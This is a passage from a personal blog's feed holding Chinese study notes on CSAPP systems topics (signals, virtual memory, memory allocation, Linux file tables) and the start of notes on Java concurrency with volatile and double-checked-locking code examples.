title="信号"></a>信号</h4><ul><li>软件形式的异常，允许进程和内核中断其他进程</li><li>底层硬件异常是由内核的Handler处理，对用户进程不可见，而信号就提供了一种机制来通知用户进程发生了这个异常（比如一个进程试图除以0，那么内核就会给它发<code>SIGFPE</code>信号）</li><li>发送信号：内核通过更新目的进程的上下文中的某个状态来发送一个信号。两种原因：内核检测到一个系统事件，所以发信号、kill函数（一个进程调用kill函数，显式的要求内核给这个进程发信号，可以给自己发信号）</li><li>目的进程被内核强迫以某种方式对信号做出反应时，就接受了信号。内核把进程从内核态切换到用户态时，会强制用户接受信号（如果有的话）</li><li>一个发出但是还没有接收的信号叫做待处理信号</li><li>一个类型最多只有一个待处理信号</li><li>进程可以有选择的阻塞某类信号，如果进程收到被阻塞的信号，那么会把这个信号加入到等待集合中，之后解除锁定后，会随之传递给此进程</li><li>每个进程都只属于一个进程组，父进程和子进程同属一个进程组，可以调用<code>setpgid</code>来改变</li><li>键入<code>Ctrl+C</code>会导致内核发送一个SIGINT给前台进程组的每个进程，默认情况下结果是终止前台job</li><li>键入<code>Ctrl+Z</code>会发送<code>SIGTSTP</code>给前台job的每个进程，默认是停止（挂起）前台job</li><li>信号处理程序可以被其他信号处理程序（不是同一个信号的handler）中断</li><li>阻塞信号<ul><li>内核默认阻塞当前信号Handler正在处理的信号的那种类型的待处理信号</li><li><code>sigprocmask</code>函数</li></ul></li><li>编写信号handler的原则<ul><li>handler要尽可能简单，比如只是设置一个flag</li><li>handler里只能调用异步信号安全的函数（比如只访问局部变量的函数，比如不能被信号中断的函数）。异步信号安全不同于线程安全，线程安全中，对于非线程安全的函数的调用，可以通过持有同一把锁来实现线程安全；但是因为信号是异步的，所以如果在持有锁时信号到来，handler运行，则会死锁——因为handler调用该函数前也要持有锁，CSAPP 3rd（英文版）的P757有一个异步线程安全的函数的表，其中不包括exit、printf等常见函数</li><li>保存和恢复errno。因为信号handler中调用的函数可能会在失败时设置errno，所以可能会干扰正常程序中的errno，所以需要在刚进入handler时保存errno，而在退出前恢复errno</li><li>如果访问了全局的数据结构，那么需要阻塞所有信号</li><li>使用volatile声明flag，volatile要求编译器每次在代码中引用flag时，都从内存中读取该值</li><li>使用<code>sig_atomic_t</code>声明变量，对其读或写是原子的，不会中断，因为可以用一条指令来实现，所以不需要暂时的阻塞信号</li></ul></li><li>信号不排队，所以接收到信号后要在循环中处理，而不能一个信号对应一次处理</li><li><code>sigsuspend</code>可以用来显式的等待信号</li><li>不对<code>SIGKILL</code>做响应的情况<ul><li>首先，<code>SIGKILL</code>不能被捕获或者忽略（<code>SIGSTOP</code>也是）</li><li>但是<code>TASK_UNINTERRUPTIBLE</code>的进程是不响应任何信号的，所以<code>SIGKILL</code>也无效</li><li>僵尸进程无法被<code>SIGKILL</code>杀死，杀死僵尸进程的方法是其父进程终止或其父进程调用wait</li></ul></li></ul><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><h4 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h4><ul><li>能力：使得可以把内存看作磁盘的cache；为进程提供一个一直的地址空间；保护进程的地址空间</li><li>地址空间：一个非负整数地址的有序集合</li><li>TLBI（TLB index）的索引是VPN（virtual page number）的低t bit索引的</li><li>需要从cache、主存获得PTE是需要MMU计算PTEA的</li><li>Linux中<strong>Swap</strong>（即：<strong>交换分区</strong>），类似于Windows的虚拟内存，就是当内存不足的时候，把一部分硬盘空间虚拟成内存使用,从而解决内存容量不足的情况。一旦一个虚拟页面被初始化（被按需页面调度进来，或者已经映射了二进制0页面（有对应的物理页）），则总是在swp space交换来交换去</li></ul><h4 id="计算物理地址的过程（不缺页版本）"><a href="#计算物理地址的过程（不缺页版本）" class="headerlink" title="计算物理地址的过程（不缺页版本）"></a>计算物理地址的过程（不缺页版本）</h4><ul><li>处理器生成虚拟地址，并传递给MMU</li><li>MMU生成PTE（页表条目）地址，并从高速缓存、主存请求得到它</li><li>高速缓存、主存向MMU返回PTE</li><li>MMU构造物理地址，并传递给高速缓存、主存</li><li>高速缓存、主存返回所请求的数据字</li></ul><h4 id="计算物理地址的过程（缺页版本）"><a href="#计算物理地址的过程（缺页版本）" class="headerlink" title="计算物理地址的过程（缺页版本）"></a>计算物理地址的过程（缺页版本）</h4><ul><li>处理器生成虚拟地址，并传递给MMU</li><li>MMU生成PTE（页表条目）地址，并从高速缓存、主存请求得到它</li><li>高速缓存、主存向MMU返回PTE</li><li>PTE中的有效位是0，所以MMU触发一次异常，传递给CPU中的控制到OS内核的中的缺页处理程序</li><li>缺页Handler确定中物理内存中的牺牲页，如果这个页面是dirty，则换出到磁盘</li><li>缺页handler把页面调入主存并更新内存中PTE</li><li>缺页handler返回原来的进程并再次执行导致缺页的指令</li></ul><h4 id="CopyOnWrite"><a href="#CopyOnWrite" class="headerlink" title="CopyOnWrite"></a>CopyOnWrite</h4><ul><li>只要进程没有试图写这些COW的区域，那么就可以共享</li><li>如果进程试图写这些区域中的某个页面时，就会触发一个保护故障，从而会在物理内存中创建这个页面的一个新副本，更新页表条目指向这个新副本</li><li>把复制副本的工作推迟到了最后时刻，从而最充分的利用了物理内存</li></ul><h4 id="Linux的虚拟内存和缺页处理"><a href="#Linux的虚拟内存和缺页处理" class="headerlink" title="Linux的虚拟内存和缺页处理"></a>Linux的虚拟内存和缺页处理</h4><ul><li>Linux将虚拟内存组织成区域的集合，一个区域是已经存在的（已分配的）虚拟内存的连续片（比如代码段、数据段、堆等）</li><li>每个存在的虚拟页面都保存在某个区域中</li><li>区域使得内核无需记录那些不存在的虚拟页</li><li>区域链表可以通过位于内核虚拟内存的<code>task_struct</code>中相关信息获得<ul><li><code>mm_struct</code>的<code>mmap</code>：指向一个<code>vm_area_structs</code>的链表，每个<code>vm_area_structs</code>都描述了当前虚拟地址空间的一个区域</li><li><code>mm_struct</code>的<code>pgd</code>：指向第一级页表（页全局目录）的基址，内核运行这个进程时，把<code>pgd</code>放在CR3控制寄存器</li><li><code>task_struct</code>：包含或指向内核运行该进程所需要的所有信息，比如PID、指向用户栈的指针、可执行目标文件的名字、程序计数器</li></ul></li><li>Linux虚拟内存的缺页异常的处理程序<ul><li>使用内核为每个进程维护的区域结构的链表来判断是否是<ul><li>访问不存在的页面(从而段错误)</li><li>缺页是因为内存访问不合法（比如写一个只读页面）导致的（从而保护异常）</li><li>正常缺页</li></ul></li><li>为什么不使用PTE的是否为null来判断呢？这样子就要维护所有的PTE，其中有的有效位为1有的为0有的PTE的某个字段为null标志这是未被映射的虚拟内存页</li></ul></li></ul><h4 id="动态内存分配"><a href="#动态内存分配" class="headerlink" title="动态内存分配"></a>动态内存分配</h4><ul><li>碎片<ul><li>内部碎片（一个已分配的块比payload大时发生，只取决于分配器的实现以及以前的请求模式）</li><li>外部碎片（空闲内存合计起来足以满足一个请求，但是没有单独一块满足时，不仅取决于以前的模式、分配器的工作方式，还取决与未来请求的模式）</li></ul></li><li>分离的空闲链表：比如可以$[2^n-1,2^{n+1}]$这个区间大小的页维护在一个空闲链表中<ul><li>简单分离存储：不分割，不合并</li><li>分离适配：确定请求的大小类，然后首次适配（找不到就到更大的大小类去找）。可选的分割，剩余部分insert到适当的空闲链表中。实在没有，就请求OS分配，然后从这个新的中分配出Request的那块，剩下的insert到空闲链表中。释放时执行合并，结果放在相应的空闲链表。malloc就是这样做的</li></ul></li><li>buddy<ul><li>每个大小类都是2的幂，为了找到$2^k$，需要找$2^p(k\leq p)$，如果$k&lt;p$，则递归的二分这个块，每次二分时，剩下的另一块都insert到空闲链表中。要释放时，合并空闲的buddy，但遇到一个已分配的buddy时，停止合并。buddy之间的地址差异只是1bit。如果大部分请求不是2的幂大小，则内部碎片多</li></ul></li></ul><h3 id="Linux的文件"><a href="#Linux的文件" class="headerlink" title="Linux的文件"></a>Linux的文件</h3><ul><li>内核用三个数据结构来表示打开的文件<ul><li>描述符表<ul><li>每个进程都有自己的描述符表</li><li>由进程打开的文件描述符索引</li><li>每个打开的描述符表项指向文件表的一个表项</li></ul></li><li>文件表<ul><li>所有进程共享这个表，表示打开的文件集合</li><li>每个表项包含：当前文件位置、引用计数（指向该表项的描述符表项数目），指向v-node表中的对应表项的指针</li><li>内核不会删除一个文件表表项，直到其引用计数为0</li><li>多个打开文件表的表项可以指向同一个v-node表的表项，比如同一进程两次调用open同一文件，是不同的文件句柄，同样的inode，这样子每个都有自己的文件位置</li></ul></li><li>v-node表<ul><li>所有进程共享这张v-node表</li><li>每个表项包含stat结构中的大多数信息</li><li>包含文件大小、文件类型、file access</li></ul></li></ul></li><li>fork中，子进程复制父进程的描述符表，所以指向相同的打开文件表表项</li><li>io重定向（比如dup2）则是使得两个描述符表项指向同一个打开文件表的表项</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;double-to-unsigned-long-long&quot;&gt;&lt;a href=&quot;#double-to-unsigned-long-long&quot; class=&quot;headerlink&quot; title=&quot;double to unsigned long long&quot;&gt;&lt;/a&gt;do
      
    
    </summary>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/categories/CSAPP/"/>
    
    
      <category term="OS" scheme="https://h-zex.github.io/tags/OS/"/>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/tags/CSAPP/"/>
    
      <category term="Linux" scheme="https://h-zex.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>My Java Concurrent Note(1)</title>
    <link href="https://h-zex.github.io/2019/04/02/Java-Concurrent-Note/"/>
    <id>https://h-zex.github.io/2019/04/02/Java-Concurrent-Note/</id>
    <published>2019-04-02T04:49:04.000Z</published>
    <updated>2019-08-05T17:17:02.099Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以下大部分是<em>java Concurrency in Practice</em>的笔记，以<code>JCIP</code>简称之</p></blockquote><h3 id="对象的状态"><a href="#对象的状态" class="headerlink" title="对象的状态"></a>对象的状态</h3><ul><li>（非正式意义上），对象的状态是指存储在状态变量中的数据，可能包括其他依赖对象的域（例如HashMap的Map.Entry对象）</li><li>对象的状态中包含了任何可能影响其外部可见行为的数据</li></ul><h3 id="线程安全性的定义"><a href="#线程安全性的定义" class="headerlink" title="线程安全性的定义"></a>线程安全性的定义</h3><ul><li><p>正确性的含义</p><ul><li><p>某个类的行为与其规范完全一致。在良好的规范中通常会定义各种不变性条件（Invariant）来约束对象的状态，以及定义各种后验条件来描述对象操作的结果</p></li><li><blockquote><p>a <strong>postcondition</strong> is a condition or predicate that must always be true just after the execution of some section of code or after an operation in a formal specification.</p></blockquote></li></ul></li><li><p>当多个线程访问某个类时，这个类始终能够表现出正确的行为，那么就称这个类是线程安全的</p></li><li><p>当多个线程访问一个对象时， 如果不用考虑这些线程在运行时环境下的调度和交替执行， 也不需要进行额外的同步， 或者在调用方进行任何其他的协调操作， 调用这个对象的行为都可以获得正确的结果， 那这个对象是线程安全的</p></li></ul><h3 id="JCIP中“同步”的含义"><a href="#JCIP中“同步”的含义" class="headerlink" title="JCIP中“同步”的含义"></a>JCIP中“同步”的含义</h3><ul><li>synchronized关键字</li><li>volatile变量</li><li>显式锁</li><li>原子变量</li></ul><h3 id="竞态条件"><a href="#竞态条件" class="headerlink" title="竞态条件"></a>竞态条件</h3><ul><li>在并发编程中，由于不恰当的执行时序而出现不正确的结果（这不是正式的定义）</li><li>竞态条件类型举例<ul><li>先检查后执行（比如<code>if(i==1) {i=10;}</code>）。大多数竞态条件的本质：基于一种可能失效的观察结果来做出判断或执行计算</li></ul></li><li>并非所有的竞态条件都是数据竞争，同样并非所有的数据竞争都是竞态条件</li></ul><h3 id="数据竞争"><a href="#数据竞争" class="headerlink" title="数据竞争"></a>数据竞争</h3><ul><li><p>访问共享的非final类型的域时没有采用同步来协同，则会出现数据竞争</p><blockquote><p>A data race occurs when:</p><ul><li>two or more threads in a <strong>single process</strong> access the same memory location concurrently, and</li><li>at least one of the accesses is for writing, and</li><li>the threads are not using any exclusive locks to control their accesses to that memory.</li></ul><p>When these three conditions hold, the order of accesses is non-deterministic, and the computation may give different results from run to run depending on that order. Some data-races may be benign (for example, when the memory access is used for a busy-wait), but many data-races are bugs in the program.</p><p><a href="https://docs.oracle.com/cd/E19205-01/820-0619/geojs/index.html" target="_blank" rel="noopener">ref from</a></p></blockquote></li><li><p>在java的内存模型中，如果在代码中存在数据竞争，那么这段代码就没有确定的语义</p></li></ul><h3 id="原子性"><a href="#原子性" class="headerlink" title="原子性"></a>原子性</h3><ul><li>假定有两个操作A、B，从执行A的线程来看，当另一个线程执行B时，要么将B完全执行完，要么完全不执行B，那么A和B对彼此来说是原子的</li><li>原子操作是指，对于访问同一个状态的所有操作（包括这个操作本身）来说，这个操作是以一种原子方式执行</li><li>与事务应用程序中的和原子性有相同的含义：一组语句作为一个不可分割的单元被执行</li></ul><h3 id="volatile变量"><a href="#volatile变量" class="headerlink" title="volatile变量"></a>volatile变量</h3><ul><li><p>只有成员变量才能使用它</p></li><li><p>用来确保变量的更新操作通知到其他线程</p><p>以下代码可以复现，无论是否有<code>server</code>模式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VolatileTest</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 去掉volatile，则无限循环</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> sleep = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span> (!sleep) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"out of sleep"</span>);</span><br><span class="line">        &#125;).start();</span><br><span class="line">        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        sleep = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>anything that was visible to thread A when it writes to volatile field <code>f</code> becomes visible to thread B when it reads <code>f</code>.</p></li><li><p>synchronized在内存可见性上的作用比volatile变量更强</p></li><li><p>依赖volatile变量来控制状态的可见性，通常比使用锁的代码更加脆弱，更加难以理解</p></li><li><p>无法确保原子性（锁可以确保原子性和可见性）</p></li><li><p>正确的使用方式</p><ul><li>确保他们状态的可见性</li><li>确保它们所引用的状态的可见性<blockquote><p>This declares a volatile reference to an array, which might not be what you want. With a volatile reference to an array, reads and writes of the reference to the array are treated as volatile, but <strong>the array elements are non-volatile</strong>. To get volatile array elements, you will need to use one of the atomic array classes in java.util.concurrent (provided in Java 5.0). (ref from <code>FindBugs</code>)</p></blockquote></li><li>标志一些重要的程序生命周期事件的发生</li></ul></li><li><p>满足以下所有条件时，才应该使用</p><ul><li>对变量的写入不依赖于当前值，或者只有单个线程<strong>写</strong>该变量</li><li>该变量不会与其他状态变量一起纳入不变性条件中</li><li>在访问变量时不需要加锁</li></ul></li><li><p>关于重排序(<a href="https://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html" target="_blank" rel="noopener">来自于</a>)</p><ul><li><p>旧内存模型</p><ul><li>Under the old memory model, accesses to volatile variables could not be reordered with each other, but they could be reordered with nonvolatile variable accesses.</li></ul></li><li><p>新内存模型（新内存模型是JSR133）</p><ul><li><p>Under the new memory model, it is still true that volatile variables cannot be reordered with each other. The difference is that it is now no longer so easy to reorder normal field accesses around them.</p></li><li><p>Writing to a volatile field has the same memory effect as a monitor release, and reading from a volatile field has the same memory effect as a monitor acquire. In effect, because the new memory model places stricter constraints on reordering of volatile field accesses with other field accesses, volatile or not, <strong>anything that was visible to thread A when it writes to volatile field <code>f</code> becomes visible to thread B when it reads <code>f</code>.</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VolatileExample</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">boolean</span> v = <span class="keyword">false</span>;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    x = <span class="number">42</span>;</span><br><span class="line">    v = <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (v == <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="comment">// uses x - guaranteed to see 42.</span></span><br><span class="line">      <span class="comment">// This would not have been true under the old memory model. </span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Effectively, the semantics of volatile have been strengthened substantially, almost to the level of synchronization. Each read or write of a volatile field acts like “half” a synchronization, for purposes of visibility.</p></li><li><p>Note that it is important for both threads to access the same volatile variable in order to properly set up the happens-before relationship. It is not the case that everything visible to thread A when it writes volatile field <code>f</code> becomes visible to thread B after it reads volatile field <code>g</code>. <strong>The release and acquire have to “match”</strong>(i.e., be performed on the same volatile field) to have the right semantics</p></li></ul></li></ul></li></ul><h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><p>－应该详细记载的内容</p><ul><li>同步策略（什么状态由什么锁保护、可见性如何维护）</li><li>加锁顺序</li><li>没有加锁情况下的同步策略（比如使用一个flag阻止其他线程在flag为true之前使用某资源）</li><li>资源池的配置（避免资源依赖死锁）</li><li>如果不能通过open call来避免死锁，那么应该详细记载如何避免在调用时出现死锁<ul><li>应该将条件队列相关联的条件谓词以及在这些谓词上等待的操作都写入文档</li></ul></li></ul><h3 id="对象的初始化"><a href="#对象的初始化" class="headerlink" title="对象的初始化"></a>对象的初始化</h3><ul><li>即使某个对象的引用对于其他线程是可见的，也并不意味着对象状态对于使用该对象的线程一定是可见的</li><li>为了确保对象状态能够呈现出一致的视图，必须使用同步</li></ul><h3 id="this逸出"><a href="#this逸出" class="headerlink" title="this逸出"></a><code>this</code>逸出</h3><ul><li>只有当对象的构造函数返回时，对象才处于可预测的和一致的状态。因此，从构造函数发布对象时，发布了一个尚未构造完成的对象。</li><li>例子：<ul><li>在构造函数启动线程</li><li>在构造函数调用一个可以override的方法（非private、非final的方法，可以被子类override）</li></ul></li><li>可以通过使用<code>start</code>函数来启动线程、使用工厂方法和私有构造函数（即不要再构造函数启动，而是在工厂方法中，构造函数返回后才启动）</li></ul><h3 id="Final域"><a href="#Final域" class="headerlink" title="Final域"></a>Final域</h3><ul><li><p>还有一种情况可以安全地访问一个共享域， 即这个域声明为 final 时</p></li><li><p>在java内存模型中，final域能确保初始化过程的安全性，从而可以不受限制的访问不可变对象，并在共享这些对象时无需同步。为了维持这种初始化安全性的保证，需要满足不可变性的所有需求</p><ul><li>状态不可修改</li><li>所有域都是final类型</li><li>正确的构造</li></ul><p>这种保证还延伸到正确创建的对象中所有final类型的域，在没有额外同步的情况下，也可以安全的访问final类型的域。不过，如果这些final域指向的是可变对象，那么访问这些域所指向的对象的状态时还是需要同步</p></li><li><p>在发布不可变对象时，没有使用同步，也可以安全地访问该对象</p></li></ul><h3 id="原子变量"><a href="#原子变量" class="headerlink" title="原子变量"></a>原子变量</h3><ul><li>如果有大量线程要访问相同的原子值， 性能会大幅下降， 因为乐观更新需要太多次重试。</li><li>Java SE 8 提供了 LongAdder 和 LongAccumulator 类来解决这个问题。LongAdder 包括多个变量（加数)， 其总和为当前值。可以有多个线程更新不同的加数，线程个数增加时会自动提供新的加数。通常情况下， 只有当所有工作都完成之后才需要总和的值， 对于这种情况，这种方法会很高效。性能会有显著的提升。</li></ul><h3 id="Double-Checked-Locking-DCL"><a href="#Double-Checked-Locking-DCL" class="headerlink" title="Double Checked Locking(DCL)"></a>Double Checked Locking(DCL)</h3><ul><li><p><a href="https://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html" target="_blank" rel="noopener">来自于</a></p></li><li><p>示例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// double-checked-locking - don't do this!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Something instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Something <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (instance == <span class="keyword">null</span>)</span><br><span class="line">        instance = <span class="keyword">new</span> Something();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>There’s only one problem with it – <strong>it doesn’t work</strong>. Why not? The most obvious reason is that the writes which initialize <code>instance</code> and the write to the <code>instance</code> field can be reordered by the compiler or the cache, which would have the effect of <strong>returning what appears to be a partially constructed <code>Something</code></strong>. The result would be that we read an uninitialized object. </p></li><li><p>There is no way to fix it using the <strong>old Java memory model.</strong></p></li><li><p>Under the new memory model, making the <code>instance</code> field volatile will “fix” the problems with double-checked locking, because then there will be a happens-before relationship between the initialization of the <code>Something</code> by the constructing thread and the return of its value by the thread that reads it.（我猜，这个happen-before是不是就是<code>程序顺序规则</code>（each action in a thread haappens-before every action in that thread that come later in the program order）和<code>传递性</code>和<code>volatile 变量规则</code>的结合——就是<code>instance=new Something()</code>在单线程中必须保证构造操作在赋值给instance操作之前，然后volatile又保证了写入在读取之前，所以一旦另一个线程读取了instance，则根据传递性，构造操作已经完成了）</p></li><li><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Something</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Something</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyHolder</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> Something INSTANCE = <span class="keyword">new</span> Something();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Something <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazyHolder.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This code is guaranteed to be correct because of <strong>the initialization guarantees for static fields; if a field is set in a static initializer, it is guaranteed to be made visible, correctly, to any thread that accesses that class</strong>.</p></li></ul><h3 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h3><ul><li>作用<ul><li>互斥</li><li>原子性（复合操作的执行过程中持有一个锁，则这组操作成为原子操作）</li><li>内存可见性（所有线程都能看到共享变量的最新值——只需要所有线程都在同一个锁上同步）</li></ul></li></ul><h3 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h3><ul><li>用于实现原子性</li><li>可重入</li><li>确定临界区</li><li>Constructors in Java can not use the synchronized keyword，但是可以<code>synchronized(this){}</code></li><li>内存可见性——某个线程修改了对象状态后，其他线程可以看到发生的状态的变化</li><li>每个对象都有一个内部锁，该锁有一个内部条件（条件对应Object对象的final方法<code>wait</code>、<code>notify</code>、<code>notifyAll</code>方法）（所以一旦某个对象的一个<code>synchronized</code>方法被调用后，该对象的另一个<code>synchronized</code>方法会被阻塞）</li><li>调用synchronized静态方法获得相关的类对象（Class对象）的内部锁。要注意，使用不同的classLoader加载出来的Class对象是不同的</li><li>监视器<ul><li>用Java的术语来讲，监视器具有如下特性：<ul><li>监视器是只包含私有域的类。</li><li>每个监视器类的对象有一个相关的锁。</li><li>使用该锁对所有的方法进行加锁。换句话说，如果客户端调用obj.meth0d(),那么obj对象的锁是在方法调用开始时自动获得（这是获得锁的唯一途径），并且当方法返回时自动释放该锁（无论是正常退出还是异常退出）。因为所有的域是私有的，这样的安排可以确保一个线程在对对象操作时，没有其他线程能访问该域</li><li>该锁可以有任意多个相关条件</li></ul></li><li>Java设计者以不是很精确的方式采用了监视器概念，Java中的每一个对象有一个内部的锁和内部的条件。如果一个方法用synchronized关键字声明，那么，它表现的就像是一个监视器方法。通过调用wait/notifyAll/notify来访问条件变量。然而，在下述的3个方面Java对象不同于监视器，从而使得线程的安全性下降：<ul><li>域不要求必须是private。</li><li>方法不要求必须是synchronized。</li><li>内部锁对客户是可用的。</li></ul></li></ul></li><li>局限<ul><li>不能中断一个正在试图获得锁的线程</li><li>没有超时</li><li>只有单一的条件</li><li>不提供公平的锁</li></ul></li></ul><h3 id="内存可见性"><a href="#内存可见性" class="headerlink" title="内存可见性"></a>内存可见性</h3><ul><li>最低安全性<ul><li>某个线程没有同步情况下读取变量，可能会得到一个失效值，但这个值至少是之前某个线程设置的，而不是随机的</li><li>Java内存模型要求，变量的读取和写入必须是原子操作，但是非<code>volatile</code>的<code>long</code>，<code>double</code>例外</li><li>JVM允许将64bit的读或写操作分解为两个32bit的操作，因此可能无法满足最低安全性（除非用<code>volatile</code>声明或是用锁保护）</li></ul></li></ul><h3 id="不可变对象"><a href="#不可变对象" class="headerlink" title="不可变对象"></a>不可变对象</h3><h4 id="需要满足的条件"><a href="#需要满足的条件" class="headerlink" title="需要满足的条件"></a>需要满足的条件</h4><ul><li>对象创建后其状态不能修改</li><li>对象的所有域是final类型的（可以不用，比如<code>String</code>的<code>hashCode</code>这个field）</li><li>对象是正确创建的（创建期间，this没有逸出）</li></ul><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><ul><li><p>对象内部可以使用可变对象来管理状态</p></li><li><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreeStooges</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;String&gt; stooges = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreeStooges</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        stooges.add(<span class="string">"Moe"</span>);</span><br><span class="line">        stooges.add(<span class="string">"Larry"</span>);</span><br><span class="line">        stooges.add(<span class="string">"Curly"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isStooge</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stooges.contains(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用<code>volatile</code>+不可变对象来实现一组状态的原子操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span 